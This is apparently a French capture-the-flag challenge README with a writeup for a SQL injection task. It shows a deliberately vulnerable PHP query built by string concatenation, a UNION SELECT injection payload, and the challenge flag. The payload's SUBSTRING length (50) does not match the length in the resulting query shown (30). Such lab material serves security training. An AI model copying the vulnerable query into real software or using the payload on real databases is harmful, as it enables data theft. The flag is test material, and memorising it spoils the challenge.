# CORRUPTED DATA
### Web
sqli

La base de données des consciences est corrompue. Je pense que le mot "flag" brise quelque chose. Il faudrait que je puisse l'ignorer dans ma recherche.

gtsthilaire

### Besoins

- Docker Apache (ou nginx), PHP et MySQL/MariaDB

### Étapes

- Ajuster les ports des services Docker dans le docker compose.

- Partir les 2 services Docker à l'aide du docker compose.

- S'assurer que le service MariaDB a bien exécuté le script SQL du dossier data.

## Writeup

- La requête est construite comme ça :
$sql = "SELECT * FROM consciences WHERE nom LIKE '%" . $nom . "%'";

- On peut donc modifier la requête en injectant ceci pour enlever le mot flag :
' UNION SELECT 1, SUBSTRING(nom, 2, 50) FROM consciences; --

- Qui donnera cette requête :
SELECT * FROM consciences WHERE nom LIKE '%%' UNION SELECT 1, SUBSTRING(nom, 2, 30) FROM consciences; -- ';

## Flag

cst{f1x_d3_c0n5c13nc35_c0rr0mpu35}
